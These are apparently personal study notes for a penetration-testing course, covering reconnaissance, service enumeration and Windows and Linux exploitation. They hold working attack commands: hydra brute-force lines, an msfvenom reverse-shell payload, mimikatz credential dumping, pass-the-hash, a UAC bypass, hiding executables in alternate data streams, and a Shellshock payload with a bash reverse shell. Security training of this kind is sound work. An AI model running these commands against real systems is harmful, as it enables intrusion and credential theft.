# TOOLS TO MASTER
- dirb (dirbuster)
- gobuster
- nmap
- hydra
- smbclient
- rpcclient
- enum4linux
- dnsdumpster.io or dnsrecon
- netcraft.com
- smbmap
- arp-scan
- wireshark
- dig
- METASPLOIT AND MSFVENOM (at least rev. tcp meterpreter payload)
- whatweb
- davtest
- cadaver
- crackmapexec
- mimikatz / kiwi
- 

# Assessment Methodologies: Information Gathering

## Information Gathering
Information Gathering is the first step of any penetration test. It's one of the most important phases, because any further steps are relying on the information we've gathered. Typically we can devide Information-Gathering in two categories:
- Passive Information Gathering
-- Identifying IP addresses & DNS information
-- Identifying domain names and domain ownership information
-- Identifying email addresses and social media profiles
-- Identifying web technologies being used on target sites
-- Identify Subdomains

- Active Information Gathering
-- Discovering open ports on target systems
-- Learning about the internal infrastructure of a target network/organization
-- Enumerating information from targets


## Passive Information Gathering
### Website Recon and Footprinting
- host hackersploit.org -> DNS lookup and get IP-Addresses -> if more than one ipv4 / ipv6 than a proxy or firewall (cloudflare etc.) is likely used by this website.
- check robots.txt file -> is used to refuse crawlers to certain directories / what files should not be indexed
- check sitemap.xml / sitemaps.xml -> provide search engines a sturcture for indexing
- buildwith -> firefox plugin for website technology and cms detection
- wappalyzer -> quite the same as buildwith
- whatweb hackersploit.org -> command for identifying web technologies and plugins that is used (equivalent to plugins mentioned above)
- httrack -> program to copy a website locally for further analysis
- whois hackersploit.org or who.is website-> query dns register

### Website Footprinting with Netcraft
- netcraft.com -> Scan a website for technology, network information, first seen, hsoting history, basic ssl vulnerability check etc.
- Easy to consume infos (collection of all methods / commands mentioned above)


### DNS Recon
- dnsrecon -d gkd-group.com -> get all dns records (NS, A, TXT, MX ..)
- dnsdumpster.io -> best dns reconnaicance tool for organized information!!!

### Detect WAF with wafw00f
- wafw00f http://www.gkd-group.com -> check if a waf is used

### subdomain enumeration with sublist3r
- sublist3r -d [DOMAIN] (opt. -t threads; -b bruteforce; -e search engines)
- -b belongs to active reconnaicance.

### Google Dorks
- site: -> limit all results to a given Domain e.g. site: gkd-group.com; site:*.ine.com -> show all subdomains that have been indexed by google.
- inurl: -> search for a part of a url e.g. site:gkd-group.com inurl:wp-content
- intitle: -> specific keyword in site-title
- filetype: -> show all files of a specific filetype e.g. pdf
- intitle:index of -> common vulnerability of directory listing.
- cache: show older versions of a website (for more details better use waybachmachine -> web.archive.org
- Use GOOGLE HACKING DATABASE (GHDB) on exploit-db.com to show some interesting queries.

### E-Mail Harvesting with theHarvester
- theHarvester command / program is preistalled on Kali & Parrot
- theHarvester -d example.com -l 500 -b linkedin -> searches for linkedin information to a given domain
- spyse source is very interesting but requires a subscription

### Leaked Password Databases
- good for password spraying ;)
- haveibeenpwned.com -> Aggregates various databreaches all over the world



## Active Information Gathering

### DNS Zone Transfers
A DNS Zone Transfer is the process to move zone Files from one DNS-Server to another. If misconfigured and left unsecured, this functionality can be abused by attackers to copy the zone files from the primary DNS server to another DNS server. A DNS Zone transfer can provide penetrations testers with a holistic view of an organizations network layout. 
- dnsenum example.com -> tries also to perform a Zone transfer
- dig axfr @NAMESERVER DOMAIN -> axfr is the Zone Transfer Switch
- fierce -dns hackersploit.org -> DNS Bruteforce

### Host Discovery with NMAP
- sN Option -> No Port-Scan Option, only Host discovery (Also known as Ping Scan or Ping Sweep) [nmap -sn 10.0.0.0/16]
- 
- OR USE NETDISCOVER to discover devices via ARP Requests. [sudo netdisvover]


### Port Scanning with NMAP
- Standard NMAP scan is a SYN scan for the 1000 most common ports
- Windows Machine can block Ping requests by default. In this case, NMAP fires up the error "Host seems down.". In this case try the -Pn switch to avoid an availability Ping Scan. (DO not check if host is down)
- nmap -Pn -p- x.x.x.x -> Scanning all Ports
- nmap -Pn -p 80 -> Scan port 80
- nmap -Pn -p 80,445,139 -> Scan a Port selection
- nmap -Pn -p 21-100 -> Scan within a given Range
- By default NMAP will perform a TCP Port-Scan. Use the -sU switch to perform a UDP scan.
- -v switch increases the verbosity
- -sV Service Version detection
- -O switch performs a Operation System Scan (not very accurate)
- -F Fast Switch (scan fewer ports than default)
- -T1-5 switch to speed up a scan (0 = paranoid; 5 = insane)
- -sU -> Perform a UDP Scan, because by default nmap will discover tcp connections. This scan will take some time!
- --top-port 25 --open -> scan top 25 ports and filter for open ports


# Assessment Methodologies: Footprinting and Scanning

## Mapping the Network
- Before any Penetration Test will start, a Scope needs to be defined. It's important that a P-test will provide a value for a customer and will not knock-out production systems.
- Physical Access (Physical Security, OSINT, Social Engineering)
- Sniffing (Passive Recon, Watch network traffic)
- ARP ()
- ICMP (Tracroute, Ping)

Tools -> WIRESHARK, ARP-SCAN, PING, FPING, NMAP, ZENMAP

### ARP-SCAN
- Run an ARP-SCAN via sudo arp-scan -I eth0 -g 10.0.0.0/16

### FPING
- Can send packets to multiple hosts at a time
- fping -I eth0 -g 10.0.0.0/16 -a 2>/dev/null    (filter out errors with the last part)





# Assessment Methodologies: Enumeration
"Enumeration is the method that a penetration tester uses to identify information about in-scope assets."
"Enumeration is defined as a process which establishes an active connection to the target hosts to discover potential attack vectors..."

## SMB: Windows Discover and Mount
- Discover via nmap (Usually Port 445 / 139 TCP).
- Linux: List SMB shares of a Server -> smbclient -L //Server
- Linux: Connect to SMB Share -> smbclient //Server/Share -U USERNAME
- Windows: Connec to SMB Share -> net use Z: \\Server\\Share PASSWORD /user:USERNAME
- Windows: Direct Access -> \\SERVER\SHARE

## SMB: NMAP Scripts
- Run nmap and identify potential targets that are using smb.
- After a target is identified, run nmap -p445 --script smb-protocols 10.x.x.x -> E.g. check if SMBv1 is used.
- nmap -p445 --script smb-security-mode 10.x.x.x -> e.g. ceck is message signing is disabled.
- nmap -p445 --script smb-enum-sessions 10.x.x.x -> Get active / logged on users with active sessions
- nmap -p445 --script smb-enum-shares 10.x.x.x -> Share enumeration
- nmap -p445 --script smb-enum-users --script-args smbusername=USERNAME,smbpassword=PASSWORD 10.x.x.x
- nmap -p445 --script smb-enum-domains --script-args smbusername=USERNAME,smbpassword=PASSWORD 10.x.x.x 10.x.x.x
- nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=USERNAME,smbpassword=PASSWORD 10.x.x.x -> enum and list share content


## SMB: SMBMAP
- Knowing when there is a Server that supports smbv1, we can utilize smbmap with a null-session.
- smbmap -u guest -p "" -d . -H 10.x.x.x
- If you get results with guest user and a null session for more than read access to IPC$ and print$ share, you should report this.
- SMBmap supports some other commands like uploading a file or listing a shared drive. See Documentation -> https://github.com/ShawnDEvans/smbmap


## Linux Samba
- metasploit has some samba / smb enumeration and exploit tools
- nmblookup -A <IP-ADDRESS>
- If we can see IPC$ with a null session you can probably connect via rpc (rpcclient)
- RPC NULL SESSION CONNECT: rpcclient -U '' -N 192.x.x.x

With an anonymous null session you can access the IPC$ share and interact with services exposed via named pipes. The enum4linux utility within Kali Linux is particularly useful; with it, you can obtain the following:
- Operating system information
- Details of the parent domain
- A list of local users and groups
- Details of available SMB shares
- The effective system security policy

## enum4linux
  - Power Tools for Linux and Windows enumeration tasks
  - USAGE: enum4linix -o 192.x.x.x

## Check for SMB Dialect / Versions of smb2
  - start metasploit
  - use auxiliary/scanner/smb/smb2
  - set RHOSTS x.x.x.x
  - run
  
## User enumeration with SMB and RPC
  - NMAP smb-enum-users script
  - Enum4Linux -> shows users
  - rpcclient NULL session and enter following command: enumdomusers
  
  
## SMB Dictionary Attack
  - Start Metasploit
  - use auxiliary/scanner/smb/smb_login
  - show options
  - at least fill RHOSTS
  - set an smb user
  - set a pass_file
  - run exploit
  
  - Using Hydra:
  - hydra -l <USERNAME> -P <PATH TO PASS-FILE> <IP> smb
  
## Find out services which are piped through smb -> named pipes are used for service communication
  - start metasploit
  - use auxiliary/scanner/smb/pipe_auditor
  - set smbuser
  - set smbpass
  - set rhosts
  
## Get SID of Users 
  - enum4linux -r -u 'admin' -p 'password1' 192.x.x.x
  

  
## FTP
- Maybe use Hydra to Bruteforce ftp: hydra -l <USERNAME> -P <PATH TO PASS-FILE> <IP> ftp
- Check for anonymous login: nmap x.x.x.x -p21 --script ftp-anon (Or try manually by username "anonymous" and no password)
  
  
## SSH
- netcat (nc) can also grab a banner by default connection (just like with an nmap service scan)
- nmap x.x.x.x -p22 --script ssh2-enum-algos -> Enumerate Alogrithms for Key creation
- nmap x.x.x.x -p22 --script ssh-hostkey --script-args ssh_hostkey=full -> Grab the full rsa hostkey (WRITE THAT DOWN!)
- nmap x.x.x.x -p22 --script ssh-auth-methods --script-args="ssh.user=admin" -> show authentication methods -> if it shows none_auth THATS DANGEROUS AND WRITE THAT DOWN!
- Dictionary Attack: hydra -l <NAME> -P /usr/share/wordlists/rockyou.txt <IP> ssh
- Bruteforce with NMAP: nmap x.x.x.x -p22 --script ssh-brute --script-args userdb=/root/user
- METASPLOIT: use auxiliary/ssh/ssh_login -> set RHOSTS, set userpass_file, set STOP_ON_SUCCESS, DEFAULT USERNAME IS ROOT
  
  
## HTTP
  ### IIS
  - whatweb <IP or DOMAIN> -> basic enumeration
  - dirb http://<DOMAIN or IO> -> Find directories with default wordlist
  - browsh --startup-url http://x.x.x.x/Default.aspx -> Rendering a website in shell
  - nmap scripts:
    - nmap x.x.x.x -sV -p80 --script http-enum
    - nmap x.x.x.x -sV -p80 --script http-headers (HTTP HEADER INFORMATION)
    - nmap x.x.x.x -sV -p80 --script http-methods --script-args http-methods.url-path=/webdav/ (or something else..)
    - nmap x.x.x.x -sV -p80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/ -> WEBDAV Scan
  
  ### APACHE
  - the same from above applies also here!
  - msfconsole
    - use auxiliary/scanner/http/http_version (check the options and run)
    - use auxiliary/scanner/http/brute_dirs -> Bruteforce / Wordlist Directories
    - ROBOTS.TXT: use auxiliary/scanner/http/robots_txt
  
  
  ## MySQL
  
  - Connect to mysql via shell
    - mysql -h x.x.x.x -u root
  - show databases;
  - use database;
  - select * from table;
  - metasploit enumeration on writeable directories of the operating system
    - use auxiliary/scanner/mysql/mysql_writable_dirs (set options (dir_list etc.) and run the exploit and maybe set verbose to false because it will tell us a lot :D )
  - dump hashes with metasploit
    - use auxiliary/scanner/maysql/mysql_hashdump -> set at least username and password and rhosts -> WRITE HASHES DOWN!
  - load system files (if we have access which should be present to previous enumeration)
    - select load_file("/etc/shadow"); -> if that works, WRITE THAT DOWN!
  - check for empty password login with nmap
    - nmap x.x.x.x -sV -p 3306 --script=mysql-empty-password
  - nmap x.x.x.x -sV -p3306 --script=mysql-users --script-args="mysqluser='root,mysqlpass=''" -> Write all users down
  - nmap x.x.x.x -sV -p3306 --script=mysql-databases --script-args="mysqluser='root,mysqlpass=''" -> Shows all Databases
  - nmap mysql-audit script can be useful. Check documentation for more info!
  
  - DICTIONARY ATTACK
    - via msfconsole -> use auxiliary/scanner/mysql/mysql_login -> set all options (pass_file etc.), set stop_on_success true and verbose to false!
    - via hydra -> hydra -l root -P <wordlist> x.x.x.x mysql
  
  ## MSSQL
  - nmap x.x.x.x -p1433 --script ms-sql-info -> general information
  - nmap x.x.x.x -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -> ntlm info
  - nmap x.x.x.x -p1433 --script ms-sql-brute --script-args userdb=<PATH>,passdb=<PATH> -> Bruteforce / Dictionary Attack
  - nmap x.x.x.x -p1433 --script ms-sql-empty-password -> Check for empty passwords
  
  - hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt 192.168.1.128 mssql
  
  - you can also run querys with nmap, check the documentation.
  
  - nmap x.x.x.x -p1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
  
  - Run cmd command:
    - nmap x.x.x.x -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xpcmdshell.cmd="ipconfig" -> Just an example
    - nmap x.x.x.x -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xpcmdshell.cmd="type c:\flag"
  
  
  - Enumerate MSSQL with Metasploit
    - use auxiliary/scanner/mssql/mssql_login -> set rhosts; set user_file; set pass_file -> exploit
    - use auxiliary/admin/mssql/mssql_enum -> set rhosts at least...
    - use auxiliary/admin/mssql/mssql_enum_sql_logins -> Enumerating possible Logins
    - use auxiliary/admin/mssql/mssql_exec -> check if you can run commands -> set cmd whoami (just as an example)
    - use auxiliary/admin/mssql/mssql_enum_domain_accounts
 
  
# Assessment Methodologies: Vulnerability Assessment
  
  ## Vulnerability overview
  - What is a vulnerability? (NIST) -> A weakness in the computational logic (e.g. code) found in software and hardware components that, wen exploited, results in a negative impact to confidentiality, integrity, or availability.
  
  - CVE (Common Vulnerabilities and Exposures)
  - NVD (National Vulnerability Database)
  

# Compliance Check of Systems
  
  - https://www.stigviewer.com/
  - https://www.niwcatlantic.navy.mil/scap/ (SCAP Vulnerability Scanner) -> Download here: https://public.cyber.mil/stigs/scap/
  
# Host and Network Penetration Testing: System / Host Based Attacks
  - Most frequently exploited windows services
    - IIS (TCP 80 /443)
    - WebDAV (TCP 80 / 443) -> HTTP extension that allows clients to update, delete, move and copy files in a webserver. (Web Server act as a File-Server)
    - SMB / CIFS (TCP 445) -> Network File Sharing
    - RDP (TCP 3389) -> GUI Remote Access Protocol
    - WinRM (TCP ports 5986/443) -> Windows remote management protocol that can be used to faciliate remote access with Windows Systems
  
  
  ### Exploiting Microsoft IIS WebDAV
    - run nmap -sV -p xxx --script=http-enum x.x.x.x to find out if a webserver uses WebDAV
    - run "davtest" command to enumerate with parameters -url -auth username:password to perform some checks of webdav server
    - use "cadaver http://xxxxxxxx/webdav/" to access contents within the webdav server
  
  ### Exploiting Microsoft IIS WebDav via Metersploit
    - Get a Payload :)
      - msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f asp > revshell.asp (Get a asp reverse shell via msfvenom)
    - upload the payload via cadaver
    - start msfconsole with postgresql (systemctl start postgresql or service postgresql start && msfconsole)
      - use multi/handler
      - set payload windows/meterpreter/reverse_tcp
      - specify LHOST and LPORT
      - run -> to start the listener and execute the shell on the webdav server.
  
  ### Exploiting SMB with PsExec
  
    - SMB is a network file sharing protocol
    - SMB is frequently used to share printers or files in a local area network
    - SMB runs on TCP 445 and originally on top of NetBIOS (TCP 139)
    - SAMABA is the Linux implementation of SMB
  
  SMB Authentication process
  ![grafik](https://user-images.githubusercontent.com/58482416/207962932-8bca3853-de10-44d9-bcb7-c8af8ea1284d.png)

  PSExec is a lightweight telnet replacement and it is very siliar to RDP (CMD level). PsExec Authentication is performed via SMB.
  
  Bruteforce smb login via metasploit
  
    - use auxiliary/scanner/smb/smb_login
    - show options and specify the needed values
  
  
  Psexec.py is the python linux implementation of psexec
    Usage: psexec.py Administrator@x.x.x.x cmd.exe
    
    
    
    ### Exploiting RDP (Bruteforce)
    
  - RDP runs by default on TCP 3389, but be aware and always do a full scan, because some companies switch to a different port
  - Veryfiy if a port is used for RDP with metasploit module auxiliary/scanner/rdp/rdp_scanner
  - Bruteforce RDP with hydra: hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333 (s specifies the Port)
  
  - use xfreerdp to connect: xfreerdp /u:administrator /p:qwertyuiop /v:10.0.0.31:3333
  
  ### Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)
  - Bluekeep allows attackers to remotely execute arbitary code and gain access to a Windows system
  - You will always get an elevated shell (system)
  - Effects XP, Vista, Windows 7, Windows Server 2008 & R2
  - Exploit is very instable and may cause system crashes frequently
  - there are msf modules to exploit this vulnerability. Just search for bluekeep
  - THIS EXPLOIT IS NOT RECOMMENDED TO RUN IN A VULNERABLITY ASSESSMENT, BECAUSE KERNEL EXPLOITS CAN CRASH SYSTEMS AND MAY CAUSE DATA LOSS!!!!!
  
  
  
  ### Exploiting WinRM
  - Windows feature, that can be configured and do not run by default. It is a remote Management Protocol that can be used to facilitate remote access to Windows systems over http(s)
  - It typical uses TCP 5985 and 5986 (https)
  - Various forms of authntication exists, normally by username and password (or by a hash)
  - We can utilize a utility called "crackmapexec" to perform a brute-force on WinRM
  - to obtain a command shell we can use "evil-winrm" (ruby script)
  
  - crackmapexec winrm x.x.x.x -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt (you can also specify multiple users in a list (just like with the -p parameter above))
  - crackmapexec winrm x.x.x.x -u administrator -p tinkerbell  -x "whoami" (Example to run code on a target, x = execute)
  
  - evil-rinrm.rb -u administrator -p 'tinkerbell' -i x.x.x.x (Directly establish a PowerShell connection, thats AWESOME!)
  
  - metasploit: search for "winrm_script" and use the exploit (set FORCE_VBS to true; Fill out all required fields) -> This is used to get a meterpreter session and obtain system rights! <3 (But credentials are needed :()
  
  
  ## Windows Privilege Escalation
  Privilege escalation = elevation of privileges from a user to another (higher priviledged) via exploring vulnerabilities or misconfigurations
  
  ### Windows Kernel Exploits
  Kernel is the core of an Operating System and is resposible for many operations (I/O, Memory Management)
  The Windows Kernel is Called "Windows NT" and has two operation modes: User Mode (Programs and services running in user mode have limited access to system resources) and Kernel Mode (unrestricted access to system resources)
  Privilege escalation on Windows systems will typically follow the following methodology:
  - Identify kernel vulnerabilities
  - Downloading, compiling and transferring kernel exploits to the target system
  
  Kernel exploits are in most cases very unstable and may cause system damage and data loss. Therfore it is not recommended to do that in a pentesting szenario.
  
  To Identify Exploits, use Windows-Exploit-Suggester or Windows-Kernel-Exploits (It compares targets patch level against microsofts vulnerability database
  - Windows-Kernel-Exploits: https://github.com/SecWiki/windows-kernel-exploits
  - Windows-Exploits-Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
  
  -> You can do that with metasploit, just search for suggester post exploitation module (after you have a session; You will need to specify the session as an option.)
  
  ### UAC Bypassing with UACMe
  
  - UAC is the User Account Control and is present in every Version of Windows since Windows Vista.
  - UAC is used to ensure that changes to the os require approval from an administrator
  - Attacks can bypass UAC to execute malicious executables with elevated privileges
  
  - You will need a local administrators password account! (Thats a prerequisite!)
  - Tool we are going to use: https://github.com/hfiref0x/UACME
  - You will need to transfer this executable to a client and you can use it to run executables with elevated privileges without a confirmation of an admin.
  - When UAC is set to the highest integrity level, it is very difficult to bypass. Only works fine with default settings
  
  - Used Command in the lab: Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
  
  
  # GET FAMILIAR WITH MSFVENOM (generating rev tcp payload) and IN GENERAL WITH MSFCONSOLE! BYPASSUAC LAB IS GREAT TO LEARN
  
  
  ### Access Token Impersonation
  
  - A windows access token is responsible for identifiying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookiue that provides users with access to a system or network resource without having to privide credentials each time a process is started or a resource is accessed.
  - Access tokens are a core element of the authentication process on windows and are created and managed by the Local Security Authority Subsystem Service (LSASS)
  - Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
  
  - Windows access tokens are categorized based on the varying security levels assigned to them:
    - Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons
    - Delegate-level tokens are typically created through an interactive login on windows, primilary through a traditinal login or through remote access protocols such as RDP
  - Impersonate-level Tokens = impersonate a token on the LOCAL SYSTEM
  - Delegate-level tokens = can impersonate tokens ON ANY SYSTEM! (extremly dangerous!)
  
  - Which windows privileges (meterpreter: getprivs) are needed for this attack?
    - SeAssignPrimaryToken
    - SeCreateToken
    - SeImpersonatePrivilege -> This is needed!!
  
  - We are always looking for admin users with local administrative privileges when performing this attack type.
  - We will be using meterpreter with the buid-in incognito module!
  
  - load the module: in an active session run "load incognito"
  - list_tokens -u (to list all available user account tokens)
  - copy the name of the access token in quotes, eg "COMPUTERNAME\Administrator"
  - impersonate_token "COMPUTERNAME\Administrator" -> This will impersonate the token and elevate our privs.
  
  
  ## Windows File System Vulnerabilities
  
  ### Alternate Data Streams (hiding malicious payload and executables in ligitimate files)
  - Alternate Data Streams (ADS) is an NTFS (New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System)
  - Any file created on an NTFS formatted drive will have two different forks/streams
    - Data stream - Default stream that contains the data of the file
    - Resource stream - Typically contains the metadata of the file
  
  - Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade detection
  - This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file.
  - This technique is usually used to evade basic signature based AVs and static scanning tools
  
  - Research again how it's exactly working.
    - notepad test.txt:secret.txt
    - type payload.exe > test.txt:payload.exe (Hide an executable)
    - run this by creating a symbolic link or in cmd via start command (not always working fine)
  
  
  
  ## Windows Credential Dumping
  
  ### Windows Password Hashes
  
  - Windows OS stores hashed user accounts passowrds locally in the SAM (Security Accounts Manager) database.
  - Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA)
  - Windows versions up to Windows Server 2003 utilize two different types of hashes:
    - LM -> LM is not case sensetive and uses no salts
    - NTLM
  - Windows disables LM hashing and utilizes NTLN hashing from Windows Vista onwards!!!
  - It is likely to come across NTLM and NT hashes! LM hashes are completely outdated!
  - The SAM Database can - for security reasons - not be copied while the os is running
  - Attackers can utilize the LSASS process to in-memory dump SAM hashes
  - In modern versions of Windows, the SAM Database is encrypted with a syskey
  - Elevated / Administrative privileges are required in order to access and interact with the LSASS process.
  
  - NTLM (or NThash) is used by Vista onwards. It is encrypted using the MD4 hashing algorithm.
  - NTLM Hashing process:
  ![grafik](https://user-images.githubusercontent.com/58482416/208968684-263c0dad-f5cd-4ea1-861b-85658c142906.png)

  
  ### Searching for Passwords In Windows Configuration Files
  - Windows Configuration Files can contain sensetive Information
  - Unattended Windows Setup Utility is used for mass installations and can left configuration files on the local client
  - The Unattended Windows Setup Utility will typically utilize one of the follwoing configuration files that contain user account and system configuration information:
    - C:\Windows\Panther\Unattend.xml
    - C:\Windows\Panther\Autounattend.xml
  - NOTE: THE PASSWORD STRINGS MAY BE ENCODED USING BASE64
  
  
  ### Dumping hashes with Mimikatz
  - Mimikatz is the defacto-standard when it comes to post-exploitation on windows systems
  - It allows the extraction of clear-text passwords, hashes and Kerberos tickets from memory
  - It can be used to extract hashes from the lsass.exe process memory where hashes are cached
  - We utilize the pre-compiled mimikatz tool, but you can also the the meterpreter extension called Kiwi
  - Mimicatz will require elevated privileges in order to run correctly (administrator or system)
  
  
  - Process in general from a remote computer
    - Initial exploit and get a meterpreter session
    - try to elevate privs to admin account
    - check meterpreter session architecture (x86 is not so good...) with sysinfo
    - migrate to the lsass proccess to get a 64bit shell and access to the sam db (with kiwi / mimikatz)
    - lsa_dump_sam -> will dump the syskey and the NTLM hashes
    - type "help" for help ;)
  
  
  - For the use of mimikatz, visit: https://adsecurity.org/?page_id=1821
    - privilege::debug
    - LSADUMP::SAM -> get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
  
  
  ### Pass the Hash Attacks
  
  - What can we do with hashes we've obtained apart from cracking them?
  - We can utilize NTLM hashes to authenticate with a target system via SMB
  - We can Use the Metasploit PsExec Module or CrackMapExec
  
  - With PsExec Module
    - use ecploit/smb/psexec
    - set LPORT, RHOSTS, SMBUser and SMBPass (Here you can specify a clear text password or the hash!)
  
  - With crackmapexec
    - crackmapexec smb x.x.x.x -u Administrator -H "<<HASH>>"
    - hit enter and here you go. (you can specify commands with the -x option (e.g. -x "ipconfig"))
  
  - winrm can also be used to perform a PTH attack
  
  
  # Host & Network Penetration Testing: System/Host Based Attacks  (LINUX-PART)
  
  ## Linux Vulnerabilities
  
  ### Frequently Exploited Linux Services
  
  - Linux Distros share the same Kernel and are all Linux variants. In most cases only the user interface is really different (and the command set in some cases)
  -Frequently exploited Linux Services
    - Apache Web Server (80 % of Web-Servers globally!!); TCP 80 /443
    - SSH; TCP 22
    - FTP; TCP 21
    - SAMBA; TCP 445
  
  
  ## Exploiting Linux Vulnerabilities
  
  ### Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)
  - Bash is the default shell for nearly all Linux Distros
  - The Shellshock vulnerability is caused by a vulnerability in Bash, wehereby Bash mistakenly executes trailing commands after a series of characters: (){:;};
  - In context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
  
  - In oder to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash
  - This vulnerability can be exploited both manually (e.g. via Burp) and automatically with the use of MSF exploit module 
  
  - Check if a Webservice is vulnerable: nmap -sV x.x.x.x --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" (specify the location of the uri!)
  - Fire up Brup and intercept a respose from the vulnerable cgi module
  - Send it to repeater and replace the User-Agent to: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd' (Bash Rev. Shell: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1)
  
  
  ### Exploiting FTP
  - FTP authentication requires a username and password combination. As a result, we can perform a bruteforce attack in the FTP Server in order to identify legitimate credentials.
  - In some cases, FTP servers may be configured to allow anonymous access, whick consequently allows anyone to access to the FTP server without providing legitimate credentials.
  
  
  
  
  
  
  
  
  
  
  
  
  

  

  
  
